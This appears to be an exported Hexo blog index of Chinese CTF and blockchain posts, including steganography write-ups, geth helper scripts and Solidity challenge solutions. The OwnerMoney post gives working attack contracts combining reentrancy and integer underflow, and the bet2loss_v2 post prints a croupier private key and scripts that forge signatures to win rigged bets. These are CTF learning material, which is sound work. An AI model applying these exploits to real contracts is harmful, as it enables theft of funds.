    <content type="text"><![CDATA[前言 看了蜜罐合约的一些知识,感觉非常有意思 蜜罐合约的利用点大都很巧妙,目的都是为了诱惑你向合约里送钱 这篇文章就不对哪个蜜罐合约实例做具体的分析了,如果带佬想看的话,可以参考分析一个有趣的蜜罐合约 和 以太坊蜜罐智能合约分析,这里只记录一下自己的心得 etherscan 上有一个可见交易的机制,在 etherscan 上对于合约与合约直接的消息传送,当 msg.value = 0 时它是不显示的,因为它们被视为合约间的相互调用而不是一笔交易.所以当我们拿到一个合约地址时,用 etherscan 查看该合约地址的交易并不一定是全部的交易信息.但看不到的这部分信息可以通过 etherchain 来查看,比如下面的例子 etherchain 不像 etherscan 自带 decode ,所以需要对 Input 手动解码,可以使用 abi-decoder 工具 对于蜜罐合约,所有的交易记录要详细审计,因为在你拿到合约之前,你不知道是否有其他人(包括合约创建者)对合约进行过操作 蜜罐合约一般只适合在主链上,不适合 CTF 因为蜜罐合约一般只是为了“骗钱”,而刚开始的时候会向里面转些钱,诱使别人向里面充钱,然后把里面的钱提出来,在测试链上,这些钱是无意义的 而且如果一旦有人识破的话,就会有交易记录,如果是在 CTF 比赛里面,其他人就会分析交易记录,就会很容易明白蜜罐合约了,而且一旦有一个人做出来,里面的钱就没了,失去了蜜罐骗钱的意义 以太坊神奇机制很多,对以太坊有一定了解也不要盲目自信,不小心就会栽跟头,牢记天上不会白白掉馅饼,三思而后行]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>蜜罐合约</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DelCTF2020 mc_easybgm]]></title>
    <url>%2F2020%2FDelCTF2020-mc-easybgm%2F</url>
    <content type="text"><![CDATA[前言 复现 DelCTF2020 mc_easybgm 附件 https://pan.baidu.com/s/178YHh19R5Pquoh74J4jODg 密码: 7m3y Solutions 题目给了提示 hint: easy stego,应该是和 mp3 隐写有关,按照常规思路,有三种思路: 直接查找 flag 查看该音频文件的波形图、频谱图，是否存在相关信息可以转化为摩斯电码 查看 mp3 中是否含有隐藏文件，提取文件 对于该题目来说,都没有什么结果,查阅到 mp3 音频帧存在帧头信息,可参考如下链接: https://blog.csdn.net/jeffchenbiao/article/details/7332863?%3E https://www.eefocus.com/lynn19861207/blog/10-03/187260_eae32.html 发现存在保留字位 private bit 可控写入信息,因此,只需要提取每一个 mf 组中的该位,组合起来,就是答案 可以从图中看到 ms 开始位为 0x28A3 ,即第 10403 字节 12345678910111213uint32 frame_sync : 12uint32 mpeg_id : 1uint32 layer_id : 2uint32 protection_bit : 1uint32 bitrate_index : 4uint32 frequency_index : 2uint32 padding_bit : 1uint32 private_bit : 1uint32 channel_mode : 2uint32 mode_extension : 2uint32 copyright : 1uint32 original : 1uint32 emphasis : 2 总共 12+1+2+1+4+2+1+1+2+2+1+1+2=32 ,即总共 4 字节, private_bit 为 24 ,所在的字节为第 3 个字节,因此该字节对应的地址为 10403+2=10405 观察每一个 mf 组,大小都为 0x1A1 , 即 417 字节 可通过写脚本解决,如下: 12345678910111213import reimport binasciin = 10405result = ''fina = ''file = open('C:/Users/lenovo/Desktop/bgm.mp3','rb')while n &lt; 1369844 : file.seek(n,0) n += 417 file_read_result = file.read(1) read_content = bin(ord(file_read_result))[-1] result = result + read_contentprint result 输出如下: 1101111101000010010101110011010101000001001010110110011000010001011111010001000101000110001001110000011001110101011111010001011100110001000101100010010101100001011001100111011001001011010110010111110100000110000101110111110101100110010110110000011001100011010001100110011001110101011011110011000100010101011000010100011001010011000100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 后面一堆 0 串都不要,只保留到 8 的倍数刚好完成,后面的 0 全部舍弃，同时将保留的数据反转，并且 8 个一组分割开，转成字符串即可 123456789import refina = ''result = '010001000110010100110001010000110101010001000110011110110101011100110011001100010110001100110000011011010011001101011111011101000011000001011111010011010110100100110111001100110100001101010010001101000100011001110100010111110101011100110000011100100011000101000100010111110100010000110011011010100100000101010110011101010010000101111101'textArr = re.findall('.&#123;'+str(8)+'&#125;', result)# textArr.append(result[(len(textArr)*8):])for i in textArr: fina = fina + chr(int(i,2)).strip('\n')print fina 最后输出如下: 参考 参考https://l1near.top/index.php/2020/05/06/52.htmlhttps://www.cnpanda.net/ctf/342.html]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>DelCTF2020</tag>
        <tag>mc_easybgm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NPUCTF2020 碰上彩虹，吃定彩虹！]]></title>
    <url>%2F2020%2FNPUCTF2020-rainbow%2F</url>
    <content type="text"><![CDATA[前言 复现 NPUCTF2020 碰上彩虹，吃定彩虹！ 附件 https://pan.baidu.com/s/1Ok_xleNJ_VDqVYUnYpWIJQ 密码: ijdv Solutions 下载附件并解压,有三个文件：lookatme.txt、maybehint.txt 和 secret 打开 lookatme.txt 发现文件是一串数字，全选以后发现最下方有几个空格和TAB换行组成的空。联想到是摩斯密码，空格 = .，TAB = - 翻译出来的摩斯密码是：.- ..- - --- -.- . -.-- ,解密得到密文 autokey ,根据解出来的密文可以判断上面的字符串经过了 autokey 加密 再看一下 maybehint.txt ,提示在txt中隐藏了一些东⻄,用 vim 查看 很明显为零宽度字符隐写，且由、、这三种字符组成, 去此网站解密,得到 do u know NTFS? 如下图 用 ntfsstreamseditor 提取如下 稍加观察可以发现其中只有几种字符，而且都为重复的，据此可以尝试词频分析 1234from collections import Counterf=open('out.txt','r')f_read=f.read()print Counter(f_read) 得到结果为这几种字符从多到少的排列顺序，组合在一起得到 ZW5jcnlwdG8= , base64 解密得到 encrypto ,百度 encrypto 可知其是一个加密软件，下载后尝试用其加密一个文件，可以得知经过其加密的文件后缀名为 crypto，将 secret 文件后缀名改为 secret.crypto 即可打开文件 可以看到文件被加密，想到 autokey，但是由于没有给出加密密钥，所以需要对其进行 爆破，参考 此网址,当然,在 break_autokey 也准备好了,运行结果如下图 结合 hint 小写, 密码为 iamthepasswd 可是用此密码解这个加密文件时却一直解不开，再结合题目描述中加粗的括号删掉，推 测是否在文件中还隐藏了什么信息，用 strings 命令查看一下文件可以发现这样一条信息 1(Oh!Youcaughtme!But...) 将其删去后再次尝试解密，即可成功解密,解密后得到一张 彩虹.png 图片, binwalk 查看有个压缩包, 用 foremost 分离得到一个加密压缩包,所以现在需要寻找密码 仔细观察图片可以发现，由五种不同颜色的横条分隔开的六块⻩色有略微深浅的差异， 用 gimp 或 ps 打开提取一下颜色 分别提取一下六种⻩色，可以发现他们颜色的 HTML标记 只有最后两位不同，从上到下 依次为70、40、73、73、57、64，将这几个数组合在一起，用 Converter 的 Hex to Text ，或者 python 的 decode(&#39;hex&#39;) ，就可以得到解压密码 解压后得到 docx 文件，想到 word 隐写，显示隐藏文字 仔细观察上面的一⻓串字母，可以在众多的小写字母中发现几个大写字母,按照顺序组合起来得到 ALPHUCK, 查阅可知是一种 Programming Language ,只由 a,c,e,i,j,o,p,s 这 8 个小写字母组成，所以删去上面的几个大写字母，在线网站解码一下即可得到 flag]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>npuctf2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejs 监听私有链pending交易并自动miner]]></title>
    <url>%2F2020%2Fauto-pending-miner%2F</url>
    <content type="text"><![CDATA[前言nodejs 监听私有链 pending 交易并自动 miner 123456789101112131415161718192021222324252627const Web3 = require('web3')var web3 = new Web3()//web3 = new Web3(new Web3.providers.IpcProvider('', ipcProviderWrapper))const web3Admin = require('./web3admin.js')web3.setProvider(new web3.providers.HttpProvider('http://localhost:8548'))web3Admin.extend(web3)function sleep(millis) &#123; return new Promise(function (resolve, reject) &#123; setTimeout(function () &#123; resolve(); &#125;, millis); &#125;);&#125;async function main()&#123; while(1)&#123; if(web3.txpool.status['pending']==1)&#123; console.log("turning off mining", web3.miner.start()); console.log("isMining?", web3.eth.mining); &#125;else&#123; console.log("turning off mining", web3.miner.stop()); console.log("isMining?", web3.eth.mining); await sleep(10000); &#125; &#125;&#125;main()]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[geth --rpcaddr]]></title>
    <url>%2F2020%2Fprivate%2F</url>
    <content type="text"><![CDATA[前言 最近在内网环境下出区块链的题目，因为是内网，所以考虑自己搭建私链，因为考虑内网环境 flag 的发送问题，所以使用 web3.py + django + nginx 的形式 记录一下使用 geth 搭建私链的坑 随便写一写，想到哪写到哪 启动私有链的时候要注意 --rpcaddr 选项 rpcaddr 默认是 localhost ，如果没有明确指定 ip ,那么 geth attach 通过 TCP 连接只能是 geth attach http://localhost:port 如果 rpcaddr 明确指定了 ip ，那么即使在本地主机，也无法通过 Web3.HTTPProvider(&#39;http://localhost:8545&#39;) 连接，被这个坑了两个多小时，一开始一直是 requests.exceptions.ConnectionError 的错误，头皮发麻，后来静下心来仔细想了一下，才想到是这个原因，做个笔记长个记性]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机械键盘-键帽]]></title>
    <url>%2F2020%2Fkeyboard%2F</url>
    <content type="text"><![CDATA[前言 记录每个阶段想要记录的东西 入了机械键盘的坑…… 好看的键帽 随意写一写…… 键帽 键帽高度 常见键帽高度按从高到低排列为：OEM(代工厂) - SP - Cherry(原厂) 球帽分为 SA - DSA ，DSA 高度从侧面看没有明显的人体工程学曲线， SA 则有符合人体工程学的曲线。 键帽材质：主要分为 ABS 、PBT 、POM 三种 使用较多的是 ABS 和 PBT 具体细节原理我就没有去了解，只知道手感好，但容易打油，最好还是选用 PBT 热升华或者二色成型 好看的键帽 只是个人认为好看的，勿喷233333 奶瓶柯基是 2020-03-22 晚上 20:00 开售，限量 130 套 排骨电耗子 排骨柴犬 奶瓶柯基黄 奶瓶柯基粉 奶瓶龙猫 奶瓶龙猫 奶瓶电玩]]></content>
      <categories>
        <category>Keyboard</category>
      </categories>
      <tags>
        <tag>Keyboadrd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sha256(py2 vs py3)]]></title>
    <url>%2F2020%2Fsha256%2F</url>
    <content type="text"><![CDATA[前言sha256 工作量证明，python2 和 python3 的不同 python2123456789101112131415def sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update(prefix.encode() + iteration) bits = ''.join(bin(int(i, 16))[2:].zfill(4) for i in h.hexdigest()) print iteration, bits[:18] if bits[:18] == "0"*18: print "The password is: " + iteration return iteration python31234567891011121314151617import hashlib,itertoolsdef sha256_pj(prefix): chars = ''.join(chr(i) for i in range(32,127)[::-1]) for password_length in range(4,5): for iteration in itertools.product(chars, repeat=password_length): iteration = ''.join(iteration) h = hashlib.sha256() h.update((prefix + iteration).encode()) bits = ''.join(bin(i)[2:].zfill(8) for i in h.digest()) print(iteration, bits[:18]) if bits[:18] == "0"*18: print("The password is: " + iteration) return iteration]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>Python2</tag>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OwnerMoney]]></title>
    <url>%2F2020%2FOwnerMoney%2F</url>
    <content type="text"><![CDATA[前言 高校战“疫”网络安全分享赛区块链 OwnerMoney 题目 以太坊 Ropsten 测试链 合约地址：https://ropsten.etherscan.io/address/0x40a590b70790930ceed4d148bf365eea9e8b35f4 题目：https://github.com/hitcxy/challenges/tree/master/2020/OwnerMoney Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115pragma solidity ^0.4.23;interface Changing &#123; function isOwner(address) view public returns (bool);&#125;contract OwnerMoney &#123; address private owner; address private backup; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; bool) public status; mapping(address =&gt; uint) public buyTimes; constructor() &#123; owner = msg.sender; backup = msg.sender; &#125; event pikapika_SendFlag(string b64email); modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; function payforflag(string b64email) onlyOwner public &#123; require(buyTimes[msg.sender] &gt;= 100); _init(); buyTimes[msg.sender] = 0; address(0x4cfbdFE01DAEF460B925773754821E7461750923).transfer(address(this).balance); emit pikapika_SendFlag(b64email); &#125; function _init() internal &#123; owner = backup; &#125; function change(address _owner) public &#123; Changing tmp = Changing(msg.sender); if(!tmp.isOwner(_owner))&#123; status[msg.sender] = tmp.isOwner(_owner); &#125; &#125; function change_Owner() &#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); if(status[msg.sender] == true)&#123; status[msg.sender] = false; owner = msg.sender; &#125; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function buy() payable public returns (bool success)&#123; require(tx.origin != msg.sender); require(uint(msg.sender) &amp; 0xfff == 0xfff); require(buyTimes[msg.sender]==0); require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); balanceOf[msg.sender] = 100; buyTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 200); require(buyTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); buyTimes[msg.sender] -= 1; return true; &#125; function balance0f(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; Analyse 查看 payforflag ，我们需要成为 owner ，同时 buyTimes[msg.sender] &gt;= 100 想要成为 owner ，可以通过 change_owner 函数实现 change_owner 函数要求必须通过合约调用，而不是外部账户调用，同时要求合约地址最后三位是 0xfff ，可以参考 https://hitcxy.com/2020/generate-address/ status[msg.sender] 要求为 true ：可以通过 change(address _owner) 解决，Changing 接口中声明了 isOwner 函数，用户可自行编写，要使 status[msg.sender] = true ，则 tmp.isOwner(_owner) 第一次调用需返回 false ，第二次调用返回 true ，所以就有了思路：设置一个初始值为 true 的变量，每次调用 isOwner()时，将其取反再返回。这样便满足了我们是 owner ，只需再满足 buyTimes[msg.sender] &gt;= 100 发现只有 sell 函数，会有 buyTimes[msg.sender] -= 1 的操作，其实这是重入问题，这里需要满足 require(_amount &gt;= 200) ，但是 buy 只能给 100 ，典型的薅羊毛问题，最后再利用整数下溢即可满足 buyTimes[msg.sender] &gt;= 100 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152pragma solidity ^0.4.23;contract attack1 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b ; OwnerMoney target = OwnerMoney(instance_address); bool public flag = true; uint public have_sell = 0; constructor() payable &#123;&#125; function isOwner(address) public returns (bool)&#123; flag = !flag; return flag; &#125; function hack1() &#123; target.change(address(this)); target.change_Owner(); target.buy.value(1)(); &#125; function hack2() &#123; target.sell(200); &#125; function hack3(string b64email) &#123; target.payforflag(b64email); &#125; function() payable &#123; if (have_sell &lt; 1) &#123; have_sell += 1; target.sell(200); &#125; &#125;&#125;contract attack2 &#123; address instance_address = 0xb9f9a887b06b54ab851928f3bc721b120876196b; OwnerMoney target = OwnerMoney(instance_address); constructor() payable &#123;&#125; function hack1() &#123; target.buy.value(1)(); target.transfer(0xde76c7f9fff36f128d153ee068ccd5a0e7b9afff,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf 高校站“疫”</tag>
        <tag>OwnerMoney</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Neat Download Manager Mac]]></title>
    <url>%2F2020%2FNeatDownloadManagerMac%2F</url>
    <content type="text"><![CDATA[前言 需要从百度云下载一些东西，但迫于太穷，百度云 SVIP 不符合我的身份，就搜集了一些百度云提速下载的方法 之前 windows 是用 Tampermonkey + IDM mac 没有 IDM ，尝试过 folx pro ,无奈没法下载百度云文件 最后找到了 Neat Download Manager ，效果如上图所示（下载速度和网络带宽也有关系），至少不是百度云的几十K或者一百多K了 安装方法 安装油猴 Tampermonkey 安装网盘助手 网盘助手 安装 Neat Download Manager Mac ,链接: https://pan.baidu.com/s/1787cmz7Y60qX1-y32kZtRA 提取码: pika 使用方法目前只能在百度网盘的「管理页面」上使用，也就是这里：https://pan.baidu.com/disk/home 使用浏览器，登录自己的百度网盘帐号。如果是别人分享的资源，可以先存到自己的网盘上 选择要下载的文件，点击页面里的 生成链接 来获取加速下载地址 右键选择 Download By NeatDownloadManager ，然后确定下载]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>baiduyun</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ethereum生成特定后缀账号的脚本]]></title>
    <url>%2F2020%2Fgenerate-address%2F</url>
    <content type="text"><![CDATA[前言ethereum 生成特定后缀账户的脚本，包括 外部账户 和 合约账户 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") generate_eoa1 可以直接生成低四位为 1b1b 的外部账户 generate_eoa2 可以生成一个外部账户，该外部账户部署的第一个智能合约的地址低四位为 1b1b]]></content>
      <categories>
        <category>Scripts</category>
      </categories>
      <tags>
        <tag>Scripts</tag>
        <tag>ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitalk]]></title>
    <url>%2F2020%2Fgitalk%2F</url>
    <content type="text"><![CDATA[前言博客增加评论功能啦！！！！ 参考https://www.jianshu.com/p/b5f509f25872 Pursue your passion, and everything else will fall into place. This is not being romantic. This is the highest order of pragmatism. —— 加布里埃爾·吉福茲 随便记录一下，没有什么逻辑性↓ 之前博客是部署在 github + coding 上，后来不知道出了什么问题，只有挂全局代理才能访问，后就把博客迁移到了 VPS 上↓ 评论功能其实一直想加上去，由于没有找到合适又好看的，就一直没有加↓ 最初尝试的是 disqus ，挺美观，但无奈由于加载速度问题还是放弃了↓ 偶然发现 gitalk 这个神奇的评论系统，就尝试了一下，还挺顺利，一次就设置成功，效果图也挺好看↓ 博客终于有评论系统啦「啦啦啦」，也可以留言哦 晓月老板的这首歌也好听哦，哈哈哈哈哈]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[D^3CTF 2019 bet2loss_v2]]></title>
    <url>%2F2019%2Fbet2loss-v2%2F</url>
    <content type="text"><![CDATA[前言利用刚过去的周末参加了 D^3CTF ，做了一道区块链的题目，在此记录一下： 以太坊 Kovan 测试链 合约地址动态生成，每个队伍合约地址分开（但是分发合约地址的账户是同一个账户，所以说还是可以查到其他人在链上的交易2333） hash-reveal-commit 随机数 出题人采用的是前后台交互的方法，所以题目没有复现，记录下解题的思想 题目要求在上面图里，官方exp入口 题目 exp ：https://github.com/hitcxy/challenges/tree/master/2019/bet2loss_v2 合约代码主要函数为 placeBet 和 settleBet ， placeBet 建立赌博，settleBet 开奖 出题人利用了 hash-reveal-commit 随机数的思想，随机数的实现放在了服务端 用户首先在前台选好下注的方式 之后服务端生成随机数 reveal 、commit、commitLastBlock 及对 commit 和 commitLastBlock 哈希后的签名 signature，signature 中包含 r、s、v，并返回 commit、commitLastBlock、r、s、v 信息 回到前端，web3.js 配合返回的数据向 meta 发起交易，交易成功被打包之后向后台发起请求 settleBet 后端收到请求后对该 commit 做开奖 题目要求是 balanceOf(you) &gt; 300000 （ 题目描述多了一个0，可以看合约里面应该是 300000 ） 12345function PayForFlag() external returns (bool success)&#123; balances[msg.sender] = balances[msg.sender].sub(300000); emit GetFlag("Get flag!"); return true;&#125; 先来看下合约里的 placeBet 代码 123456789101112131415161718192021222324252627282930function placeBet(uint8 betnumber, uint8 modulo, uint40 wager, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v) external &#123; require (msg.sender != croupier, "croupier cannot bet with himself."); require (isContract(msg.sender)==false, "Only bet with real people."); AirdropCheck(); Bet storage bet = bets[commit]; require (bet.player == address(0), "Bet should be in a 'clean' state."); require (balances[msg.sender] &gt;= wager, "no more balances"); require (modulo &gt; 1 &amp;&amp; modulo &lt;= MAX_MODULO, "modulo should be within range."); require (betnumber &gt;= 0 &amp;&amp; betnumber &lt; modulo, "betnumber should be within range."); require (wager &gt;= MIN_BET &amp;&amp; wager &lt;= MAX_BET, "wager should be within range."); require (block.number &lt;= commitLastBlock, "Commit has expired."); bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit)); require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); lockedInBets = uint128(wager); balances[msg.sender] = balances[msg.sender].sub(uint256(wager)); emit Commit(commit); bet.wager = wager; bet.betnumber = betnumber; bet.modulo = modulo; bet.placeBlockNumber = uint40(block.number); bet.player = msg.sender;&#125; 这里有一个签名验证 12bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));require (croupier == ecrecover(signatureHash, v, r, s), "ECDSA signature is not valid."); 根据上述合约里面的签名验证对应修改服务端后台签名验证方式，参考链接为 HCTF2018_bet2loss 123456789101112131415161718192021222324252627def random_num(start=2**20, end=2**30): random = Random() return random.randint(start,end)def random(): result = &#123;'address': config['address'], 'gasPrice': 12000000000&#125; reveal = random_num() result['commit'] = "0x"+sha3.keccak_256(bytes.fromhex(binascii.hexlify(reveal.to_bytes(32, 'big')).decode('utf-8'))).hexdigest() result['commitLastBlock'] = w3.eth.blockNumber + 250 message = binascii.hexlify(result['commitLastBlock'].to_bytes(5,'big')).decode('utf-8')+result['commit'][2:] message_hash = '0x'+sha3.keccak_256(bytes.fromhex(message)).hexdigest() signhash = w3.eth.account.signHash(message_hash, private_key=private_key) result['signature'] = &#123;&#125; result['signature']['r'] = '0x' + binascii.hexlify((signhash['r']).to_bytes(32,'big')).decode('utf-8') result['signature']['s'] = '0x' + binascii.hexlify((signhash['s']).to_bytes(32,'big')).decode('utf-8') result['signature']['v'] = signhash['v'] for key,value in result.items(): print('&#123;key&#125;:&#123;value&#125;'.format(key = key, value = value)) return result,reveal,w3.eth.blockNumber 这样的话，我们就能够模拟服务端生成随机数了，通过下面的 placeBet 交易便能够通过签名验证，然后通过 settleBet 开奖，需要注意的是，开奖要使用 croupier 对应的私钥签名交易 croupier 对应私钥可以在 HCTF2018_bet2loss 的 settings.py 中找到 private_key = b&#39;o\x08\xd7A\x949\x90t#\x81\xe1&quot;4FU:c\xb3\x8a:\xa8k\xee\xf1\xe9\xfc_\xcfa\xe6m\x12&#39; 不过需要注意的是，这里的 blocknumber 是在交易上链之前获取的，所以这里并不是 placeBet 最后上链的区号，这里我采用了爆破的方法，使用了五个用户账号，blocknumber分别等于 w3.eth.blocknumber + 2(3、4、5、6) 的方式进行交易，如果哪个区号对应在链上开奖中奖的话，就用对应的用户账号继续开奖即可（因为每个账户可以开奖16次，这里中一次奖是 100*1000=100000 ，所以再用第一次获取的随机数开奖3次即可大于 300000） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152result,reveal,blocknumber = random()print("reveal=",reveal)def placeBet1(): modulo = 100 wager = 1000 blocknumber = w3.eth.blockNumber+2 print("blocknumber=",blocknumber) tmp = binascii.hexlify(reveal.to_bytes(32,'big')).decode('utf-8')+binascii.hexlify(blocknumber.to_bytes(32,'big')).decode('utf-8') tmp_hash = '0x'+sha3.keccak_256(bytes.fromhex(tmp)).hexdigest() print("tmp_hash16=",int(tmp_hash, 16)) betnumber = int(tmp_hash, 16) % modulo print("betnumber=",betnumber) commitLastBlock = result['commitLastBlock'] commit = result['commit'] r = result['signature']['r'] s = result['signature']['s'] v = result['signature']['v'] txn = contract_instance.functions.placeBet(betnumber, modulo, wager, commitLastBlock, int(commit,16), r, s, int(v)).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public1)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private1) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptdef settleBet1(): txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptprint(settleBet1()) 自己做题当中是第三个用户账户成功开奖，所以用第三个账户再重复三次开奖即可，这里的 reveal 是第一次 placeBet 获取到的 12345678910111213141516171819def settleBet3(): reveal = 0x307e29ef txn = contract_instance.functions.settleBet(reveal).buildTransaction( &#123; 'chainId':3, 'nonce':w3.eth.getTransactionCount(Web3.toChecksumAddress(public_key)), 'gas':7600000, 'value':Web3.toWei(0,'ether'), 'gasPrice':w3.eth.gasPrice, &#125; ) signed_txn = w3.eth.account.signTransaction(txn,private_key=private_key) res = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(res) print(res) return txn_receiptfor i in range(3): print(settleBet3())]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>D^3CTF</tag>
        <tag>bet2loss_v2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xctf final 2019 Happy_DOuble_Eleven]]></title>
    <url>%2F2019%2FHappy-DOuble-Eleven%2F</url>
